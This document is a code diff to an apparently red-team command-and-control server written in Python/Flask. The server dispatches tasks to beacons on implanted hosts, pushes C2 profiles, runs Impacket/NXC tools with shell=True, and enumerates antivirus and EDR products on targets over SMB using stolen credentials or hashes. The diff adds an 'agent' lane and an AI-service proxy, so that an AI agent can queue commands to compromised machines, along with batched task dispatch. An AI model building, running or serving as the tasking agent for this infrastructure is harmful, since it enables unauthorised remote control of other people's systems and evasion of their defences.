@@ -14,6 +14,7 @@ Usage:
 import argparse
 import base64
 import hashlib
+import http.client
 import json
 import logging
 import os
@@ -23,6 +24,8 @@ import ssl
 import subprocess
 import threading
 import time
+import urllib.error
+import urllib.request
 import uuid
 from datetime import datetime, timezone
 from pathlib import Path
@@ -123,6 +126,25 @@ _pending_gists: dict[str, dict] = {}
 _active_c2_profile: dict = {}
 _active_c2_profile_source: str = ""
 _name_counter = 0
+
+TASK_LANES = ("operator", "agent")
+BATCH_MAX = 8
+TOOL_RUNS_MAX = 50
+TOOL_OUTPUT_MAX = 65536
+
+
+def _clean_caps(payload: dict) -> list:
+    # Only a list counts: `"batch" in "batch-ish"` would be a substring match.
+    caps = payload.get("caps")
+    return [c for c in caps if isinstance(c, str)] if isinstance(caps, list) else []
+
+
+def _as_text(data) -> str:
+    if data is None:
+        return ""
+    if isinstance(data, bytes):
+        return data.decode("utf-8", errors="replace")
+    return data
 
 
 def _assign_name() -> str:
@@ -314,7 +336,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                 status = "stale"
             else:
                 status = "offline"
-            agent_list.append({**info, "status": status})
+            agent_list.append({**info, "status": status,
+                               "caps": info.get("caps") or []})
         return jsonify(agent_list)
 
     @app.route("/api/agents/<agent_id>", methods=["GET"])
@@ -322,7 +345,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
     def api_agent_detail(agent_id):
         if agent_id not in agents:
             return jsonify({"error": "not found"}), 404
-        return jsonify(agents[agent_id])
+        return jsonify({**agents[agent_id],
+                        "caps": agents[agent_id].get("caps") or []})
 
     @app.route("/api/agents/<agent_id>/task", methods=["POST"])
     @require_auth
@@ -330,12 +354,16 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if agent_id not in agents:
             return jsonify({"error": "not found"}), 404
         data = request.json
+        lane = data.get("lane", "operator")
+        if lane not in TASK_LANES:
+            return jsonify({"error": f"lane must be one of {list(TASK_LANES)}"}), 400
         task = {
             "id": str(uuid.uuid4())[:8],
             "cmd": data.get("cmd", ""),
             "args": data.get("args", ""),
             "data": data.get("data", ""),
             "timeout": data.get("timeout", 300),
+            "lane": lane,
             "queued": _now(),
             "status": "pending",
         }
@@ -344,12 +372,13 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "task_id": task["id"],
             "cmd": task["cmd"],
             "args": task["args"],
+            "lane": lane,
             "timestamp": task["queued"],
             "status": "pending",
             "output": None,
         })
         _log_event("TASK", f"cmd={task['cmd']} args={task.get('args','')} "
-                   f"task_id={task['id']}", agent_id=agent_id)
+                   f"lane={lane} task_id={task['id']}", agent_id=agent_id)
         return jsonify(task)
 
     @app.route("/api/agents/<agent_id>/history", methods=["GET"])
@@ -478,49 +507,116 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
 
     # ── Server-side tool execution (Impacket, NXC) ──
 
-    server_exec_state = {"status": "idle", "output": "", "tool": ""}
+    # One entry per run, so the agent can have several tools running at once
+    # without overwriting each other. The parameterless result endpoint keeps
+    # the old single-slot contract for the GUI: it returns the newest run the
+    # operator started.
+    tool_runs: dict = {}
+    tool_runs_lock = threading.Lock()
 
-    def _run_server_cmd(cmd_str, tool_name):
-        server_exec_state["status"] = "running"
-        server_exec_state["tool"] = tool_name
-        server_exec_state["output"] = ""
+    def _start_run(tool, origin):
+        # Created here, in the request handler, never in the worker thread:
+        # the GUI polls the legacy endpoint and stops at the first status that
+        # is not "running". If the entry only appeared once the thread got
+        # going, an early poll would find the previous run, already "ok", and
+        # render its output as this run's result.
+        run = {"status": "running", "output": "", "tool": tool,
+               "origin": origin, "started": time.time(), "truncated": False}
+        run_id = uuid.uuid4().hex[:12]
+        with tool_runs_lock:
+            tool_runs[run_id] = run
+            while len(tool_runs) > TOOL_RUNS_MAX:
+                del tool_runs[next(iter(tool_runs))]
+        return run_id, run
+
+    def _finish_run(run, output, status, tail=""):
+        # status goes last: a poller that sees it leave "running" must find
+        # the output already in place.
+        room = TOOL_OUTPUT_MAX - len(tail)
+        run["truncated"] = len(output) > room
+        run["output"] = output[:room] + tail
+        run["status"] = status
+
+    def _run_view(run):
+        return {k: run[k] for k in ("status", "output", "tool", "origin", "truncated")}
+
+    def _run_server_cmd(run, command, timeout, use_shell):
+        tool_name = run["tool"]
         try:
             r = subprocess.run(
-                cmd_str, shell=True, capture_output=True, text=True,
-                timeout=300,
+                command, shell=use_shell, capture_output=True, text=True,
+                timeout=timeout,
             )
             output = r.stdout
             if r.stderr:
                 output += "\n--- STDERR ---\n" + r.stderr
-            server_exec_state["output"] = output[:65536]
-            server_exec_state["status"] = "ok" if r.returncode == 0 else "error"
+            _finish_run(run, output, "ok" if r.returncode == 0 else "error")
             _log_event("TOOL", f"{tool_name} finished (exit={r.returncode})")
-        except subprocess.TimeoutExpired:
-            server_exec_state["output"] = "[timeout after 300s]"
-            server_exec_state["status"] = "error"
+        except subprocess.TimeoutExpired as e:
+            # TimeoutExpired carries what the child had written, as bytes even
+            # with text=True, and None for a stream that stayed empty.
+            output = _as_text(e.stdout)
+            if e.stderr:
+                output += "\n--- STDERR ---\n" + _as_text(e.stderr)
+            _finish_run(run, output, "error",
+                        tail=f"\n[timeout after {timeout}s, partial output]")
+            _log_event("TOOL", f"{tool_name} timed out after {timeout}s")
         except Exception as e:
-            server_exec_state["output"] = f"[error: {e}]"
-            server_exec_state["status"] = "error"
+            _finish_run(run, f"[error: {e}]", "error")
 
     @app.route("/api/server/exec", methods=["POST"])
     @require_auth
     def api_server_exec():
         body = request.get_json(silent=True) or {}
-        cmd = body.get("cmd", "")
         tool = body.get("tool", "custom")
-        if not cmd:
-            return jsonify({"error": "no command"}), 400
-        _log_event("TOOL", f"Executing server-side: {tool} → {cmd[:120]}")
+        origin = body.get("origin", "operator")
+        timeout = body.get("timeout", 300)
+        if "argv" in body and "cmd" in body:
+            return jsonify({"error": "give argv or cmd, not both"}), 400
+        argv = body.get("argv")
+        cmd = body.get("cmd", "")
+        if argv is not None:
+            if (not isinstance(argv, list) or not argv
+                    or not all(isinstance(a, str) and a for a in argv)):
+                return jsonify({"error": "argv must be a non-empty list of strings"}), 400
+            shown = " ".join(argv)
+        else:
+            if not cmd or not isinstance(cmd, str):
+                return jsonify({"error": "no command"}), 400
+            shown = cmd
+        if origin not in TASK_LANES:
+            return jsonify({"error": f"origin must be one of {list(TASK_LANES)}"}), 400
+        if isinstance(timeout, bool) or not isinstance(timeout, int) or timeout <= 0:
+            return jsonify({"error": "timeout must be a positive integer"}), 400
+        who = "" if origin == "operator" else f" [{origin}]"
+        _log_event("TOOL", f"Executing server-side{who}: {tool} → {shown[:120]}")
+        run_id, run = _start_run(tool, origin)
         t = threading.Thread(
-            target=_run_server_cmd, args=(cmd, tool), daemon=True
+            target=_run_server_cmd,
+            args=(run, argv if argv is not None else cmd, timeout, argv is None),
+            daemon=True,
         )
         t.start()
-        return jsonify({"status": "started", "tool": tool})
+        return jsonify({"status": "started", "run_id": run_id, "tool": tool})
 
     @app.route("/api/server/exec/result", methods=["GET"])
     @require_auth
     def api_server_exec_result():
-        return jsonify(server_exec_state)
+        with tool_runs_lock:
+            runs = list(tool_runs.values())
+        for run in reversed(runs):
+            if run["origin"] == "operator":
+                return jsonify(_run_view(run))
+        return jsonify({"status": "idle", "output": "", "tool": "",
+                        "origin": "operator", "truncated": False})
+
+    @app.route("/api/server/exec/result/<run_id>", methods=["GET"])
+    @require_auth
+    def api_server_exec_run_result(run_id):
+        run = tool_runs.get(run_id)
+        if run is None:
+            return jsonify({"error": "not found"}), 404
+        return jsonify(_run_view(run))
 
     # ── AV/EDR enumeration via SMB (based on NXC enum_av) ──
 
@@ -562,10 +658,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         {"name":"osquery","services":["osqueryd"],"pipes":[]},
     ]
 
-    def _run_av_enum(target, username, password, domain, use_hash):
-        server_exec_state["status"] = "running"
-        server_exec_state["tool"] = "avenum"
-        server_exec_state["output"] = ""
+    def _run_av_enum(run, target, username, password, domain, use_hash):
         try:
             from impacket.smbconnection import SMBConnection
             from impacket.dcerpc.v5 import transport, lsat, lsad, scmr
@@ -760,13 +853,11 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                 lines.append("  No endpoint protection detected (clean target)")
 
             smb.logoff()
-            server_exec_state["output"] = "\n".join(lines)
-            server_exec_state["status"] = "ok"
+            _finish_run(run, "\n".join(lines), "ok")
             _log_event("TOOL", f"AV enum on {target}: {len(all_found)} products found")
 
         except Exception as e:
-            server_exec_state["output"] = f"[!] AV enumeration failed: {e}"
-            server_exec_state["status"] = "error"
+            _finish_run(run, f"[!] AV enumeration failed: {e}", "error")
 
     @app.route("/api/server/avenum", methods=["POST"])
     @require_auth
@@ -780,9 +871,10 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if not target:
             return jsonify({"error": "target required"}), 400
         _log_event("TOOL", f"AV enum started on {target}")
+        _, run = _start_run("avenum", "operator")
         t = threading.Thread(
             target=_run_av_enum,
-            args=(target, username, password, domain, use_hash),
+            args=(run, target, username, password, domain, use_hash),
             daemon=True,
         )
         t.start()
@@ -1686,6 +1778,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
                 "args": "",
                 "data": json.dumps({"c2_profile": _active_c2_profile}),
                 "timeout": 60,
+                "lane": "operator",
                 "queued": _now(),
                 "status": "pending",
             }
@@ -1701,6 +1794,47 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             pushed.append(aid)
         _log_event("C2-PROFILE", f"Pushed profile to {len(pushed)} agent(s)")
         return jsonify({"ok": True, "pushed": pushed, "count": len(pushed)})
+
+    # ── AI agent service proxy ──
+    # HTTP only: the agent service is a separate process that may be absent,
+    # crashed or replaced, so nothing from software/agent/ is imported here.
+
+    @app.route("/api/ai/<path:p>", methods=["GET", "POST"])
+    @require_auth
+    def api_ai_proxy(p):
+        agent_url = (_server_config.get("agent_url")
+                     or os.environ.get("AGENT_URL") or "")
+        if not agent_url:
+            return jsonify({"error": "agent service unavailable",
+                            "detail": "no agent_url configured"}), 503
+        target = agent_url.rstrip("/") + "/" + p
+        if request.query_string:
+            target += "?" + request.query_string.decode("latin-1")
+        # Only these two headers cross over. The operator's Authorization
+        # header is the C2 credential and must never reach another service.
+        headers = {}
+        if request.content_type:
+            headers["Content-Type"] = request.content_type
+        agent_token = os.environ.get("RACCOON_AGENT_TOKEN")
+        if agent_token:
+            headers["X-Agent-Token"] = agent_token
+        data = request.get_data() if request.method == "POST" else None
+        try:
+            req = urllib.request.Request(target, data=data, headers=headers,
+                                         method=request.method)
+            try:
+                upstream = urllib.request.urlopen(req, timeout=30)
+            except urllib.error.HTTPError as e:
+                upstream = e
+            with upstream:
+                return Response(upstream.read(), status=upstream.getcode(),
+                                content_type=upstream.headers.get("Content-Type"))
+        except ValueError:
+            return jsonify({"error": "agent service unavailable",
+                            "detail": "invalid agent_url"}), 503
+        except (OSError, http.client.HTTPException) as e:
+            return jsonify({"error": "agent service unavailable",
+                            "detail": str(getattr(e, "reason", None) or e)}), 503
 
     # ── Beacon catch-all (handles any POST path) ──
 
@@ -1763,6 +1897,8 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
                 "pid": payload.get("pid", 0),
                 "interval": payload.get("interval", 300),
                 "local_ips": payload.get("local_ips", []),
+                "caps": _clean_caps(payload),
+                "uplink_iface": payload.get("uplink_iface"),
                 "last_seen": _now(),
                 "_last_seen_ts": time.time(),
             })
@@ -1788,6 +1924,8 @@ def _handle_register(payload: dict, crypto: ServerCrypto):
         "proxy_mode": payload.get("proxy_mode", ""),
         "proxy_active": payload.get("proxy_active", ""),
         "uptime": payload.get("uptime", 0),
+        "caps": _clean_caps(payload),
+        "uplink_iface": payload.get("uplink_iface"),
         "registered": _now(),
         "last_seen": _now(),
         "_last_seen_ts": time.time(),
@@ -1829,6 +1967,23 @@ def _do_delete_gist(gist_id):
     _pending_gists.pop(gist_id, None)
 
 
+def _take_tasks(queue: list, limit: int) -> list:
+    """Remove and return up to `limit` tasks, operator-lane tasks first.
+
+    This is deliberately not queue.pop(0): an operator typing a command must
+    not wait behind a backlog the agent queued. Each lane stays FIFO, and a
+    queue holding only operator tasks (every queue today) yields exactly what
+    pop(0) did. A task with no "lane" key counts as operator, because a
+    KeyError here would fail the check-in of every beacon.
+    """
+    operator = [t for t in queue if t.get("lane", "operator") != "agent"]
+    agent = [t for t in queue if t.get("lane", "operator") == "agent"]
+    taken = (operator + agent)[:limit]
+    taken_ids = {id(t) for t in taken}
+    queue[:] = [t for t in queue if id(t) not in taken_ids]
+    return taken
+
+
 def _handle_beacon(payload: dict, crypto: ServerCrypto):
     agent_id = payload.get("agent_id")
     if not agent_id:
@@ -1854,14 +2009,16 @@ def _handle_beacon(payload: dict, crypto: ServerCrypto):
 
         queue = task_queues.get(agent_id, [])
         if queue:
-            task = queue.pop(0)
-            task["status"] = "dispatched"
-            task["dispatched"] = _now()
-            logger.info("Dispatching task %s (%s) to %s",
-                        task["id"], task["cmd"], agent_id)
-            _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
-                       f"task_id={task['id']}", agent_id=agent_id)
-            resp = crypto.wrap(task)
+            batching = "batch" in (agents[agent_id].get("caps") or [])
+            tasks = _take_tasks(queue, BATCH_MAX if batching else 1)
+            for task in tasks:
+                task["status"] = "dispatched"
+                task["dispatched"] = _now()
+                logger.info("Dispatching task %s (%s) to %s",
+                            task["id"], task["cmd"], agent_id)
+                _log_event("DISPATCH", f"cmd={task['cmd']} args={task.get('args','')} "
+                           f"task_id={task['id']}", agent_id=agent_id)
+            resp = crypto.wrap({"tasks": tasks} if batching else tasks[0])
             return jsonify(resp)
 
     return jsonify(crypto.wrap({}))
